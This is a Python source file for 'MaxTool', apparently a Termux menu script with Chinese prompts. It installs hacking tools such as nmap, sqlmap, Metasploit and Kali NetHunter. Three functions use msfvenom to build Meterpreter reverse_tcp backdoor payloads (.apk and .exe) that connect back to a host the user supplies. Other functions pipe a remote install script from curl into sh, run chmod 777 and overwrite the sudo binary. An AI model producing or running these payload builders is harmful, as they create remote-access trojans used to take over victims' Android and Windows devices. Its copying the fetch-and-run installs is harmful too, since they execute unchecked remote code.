import os, sys
from time import sleep as timeout
from subprocess import check_output as inputstream
maxtool_banner = """
 __  __         _______          _ 
|  \/  |       |__   __|        | |
| \  / | __ ___  _| | ___   ___ | |
| |\/| |/ _` \ \/ / |/ _ \ / _ \| |
| |  | | (_| |>  <| | (_) | (_) | |
|_|  |_|\__,_/_/\_\_|\___/ \___/|_|

       BY：fulian23
"""

def restart():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()
def banner():
    print(maxtool_banner)

def nmap():
    print('\n###### Installing Nmap')
    os.system('apt update && apt upgrade')
    os.system('apt install nmap')
    print('###### Done')
    print("###### Type 'nmap' to start.")
    restart()

def gcc():
    print('\n######installing######')
    os.system("apt install gcc")
    print('###### Done ######')

def update():
    print("\n更新中，请稍候...\n")
    pwd = os.getcwd()
    os.system("cd %s" %pwd)
    os.system("git stash && git pull origin master")
    os.system("cd ~")
    print("\n更新完成!\n")
    restart()

def sqlmap():
    print('\n###### Installing sqlmap')
    os.system('apt update && apt upgrade')
    os.system('apt install git python2')
    os.system('git clone https://github.com/sqlmapproject/sqlmap')
    os.system('mv sqlmap ~')
    print('###### Done')
    restart()
    
def jichu():
    print('\n###### Installing jichu')
    os.system('apt update ')
    os.system('pkg install vim curl wget git unzip unrar')
    print('###### Done')
    restart()

def ohmyzsh():
    print('\n###### Installing oh-my-zsh')
    os.system('apt update')
    os.system('pkg install curl')
    os.system('sh -c "$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)"')
    print('###### Done')
    restart()
    
def metasploit():
    print('\n###### Installing Metasploit')
    os.system("apt update && apt upgrade")
    os.system("apt install unstable-repo")
    os.system("cd ~ && apt install metasploit")
    print('###### Done')
    print("###### Type 'msfconsole' to start.")
    restart()
    
def ubuntu():
    print('\n###### Installing Ubuntu')
    os.system('apt update && apt upgrade')
    os.system('apt install python2 git')
    os.system('git clone https://github.com/Neo-Oli/termux-ubuntu')
    os.system('mv termux-ubuntu ~ && cd ~/termux-ubuntu && bash ubuntu.sh')
    print('###### Done')
    restart()
    
def nethunter():
    print('\n###### Installing Kali NetHunter')
    os.system('apt update && apt upgrade')
    os.system('apt install git')
    os.system('git clone https://github.com/Hax4us/Nethunter-In-Termux')
    os.system('mv Nethunter-In-Termux ~')
    print('###### Done')
    restart()
    
def fedora():
    print('\n###### Installing Fedora')
    os.system('apt update && apt upgrade')
    os.system('apt install wget git')
    os.system('wget https://raw.githubusercontent.com/nmilosev/termux-fedora/master/termux-fedora.sh')
    os.system('mv termux-fedora.sh ~')
    print('###### Done')
    restart()
    
def sudo():
    print('\n###### Installing sudo')
    os.system('apt update && apt upgrade')
    os.system('apt install ncurses-utils git')
    os.system('git clone https://github.com/st42/termux-sudo')
    os.system('mv termux-sudo ~ && cd ~/termux-sudo && chmod 777 *')
    os.system('cat sudo > /data/data/com.termux/files/usr/bin/sudo')
    os.system('chmod 700 /data/data/com.termux/files/usr/bin/sudo')
    print('###### Done')
    restart()
    
def arch():
    print('\n###### Installing Fedora')
    os.system('apt update && apt upgrade')
    os.system('apt install wget')
    os.system('wget https://raw.githubusercontent.com/sdrausty/TermuxArch/master/setupTermuxArch.shbash')
    print('###### Done')
    restart()
    
def android():
    LHOST = input("请输入本机IP地址 >>> ")
    LPORT = input("请输入要监听的端口 >>> ")
    name = input("请输入文件名字(.apk) >>> ")
    bcml = input("请输入保存地址 >>> ")
    print("正在为Android生成LHOST为: %s LPORT为: %s 的 %s文件..."%(LHOST,LPORT,name))
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s/%s" %(LHOST,LPORT,bcml,name))
    print("生成完毕!2秒后重启程序")
    timeout(2)
    restart()
    
def windows():
    LHOST = input("请输入本机IP地址 >>> ")
    LPORT = input("请输入要监听的端口 >>> ")
    name = input("请输入文件名字(.exe) >>> ")
    bcml = input("请输入保存地址 >>> ")
    print("正在为Windouws生成LHOST为: %s LPORT为: %s 的 %s文件..."%(LHOST,LPORT,name))
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > %s/%s" % (LHOST,LPORT,bcml,name))
    print("生成完毕!2秒后重启程序")
    timeout(2)
    restart()
    
def windows64():
    LHOST = input("请输入本机IP地址 >>> ")
    LPORT = input("请输入要监听的端口 >>> ")
    name = input("请输入文件名字(.exe) >>> ")
    bcml = input("请输入保存地址 >>> ")
    print("正在为Windouws 64位生成LHOST为: %s LPORT为: %s 的 %s文件..."%(LHOST,LPORT,name))
    os.system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > %s/%s" % (LHOST,LPORT,bcml,name))
    print("生成完毕!2秒后重启程序")
    timeout(2)
    restart()
       
def qhy():
    print("更换清华源中，请稍后...")
    os.system("rm -rf $PREFIX/etc/apt/sources.list")
    os.system('echo "deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main" >$PREFIX/etc/apt/sources.list')
    os.system("apt update")
    print("更换成功！2秒后重启")
    timeout(2)
    restart()
    
def gfy():
    print("恢复官方源中，请稍后...")
    os.system("rm -rf $PREFIX/etc/apt/sources.list")
    os.system('echo "deb https://termux.org/packages/ stable main" >$PREFIX/etc/apt/sources.list')
    os.system("apt  update")
    print("恢复成功！2秒后重启")
    timeout(2)
    restart()
    
